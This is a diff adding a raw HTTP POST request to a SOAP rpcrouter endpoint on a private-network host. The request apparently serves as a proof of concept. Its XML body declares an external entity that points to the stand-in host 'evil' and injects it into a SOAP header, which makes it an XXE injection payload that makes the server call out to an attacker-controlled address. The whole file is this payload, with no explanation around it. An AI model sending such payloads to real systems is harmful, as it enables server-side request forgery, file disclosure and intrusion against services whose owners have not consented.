@@ -1,0 +1,24 @@
+POST /soap/servlet/rpcrouter HTTP/1.1
+Host: 192.168.138.133:8443
+Cache-Control: max-age=0
+Content-Type: text/xml; charset=utf-8
+Content-Length: 651
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://evil/AAAAAAAAAAAAA" >
+]>
+<soapenv:Envelope
+xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <soapenv:Header>
+    <ns1:RequestHeader
+    soapenv:actor="http://schemas.xmlsoap.org/soap/actor/next"
+    soapenv:mustUnderstand="0"
+    xmlns:ns1="https://www.google.com/apis/ads/publisher/v201805">
+      <ns1:aa>&xxe;</ns1:aa>
+    </ns1:RequestHeader>
+  </soapenv:Header>
+  <soapenv:Body></soapenv:Body>
+</soapenv:Envelope>
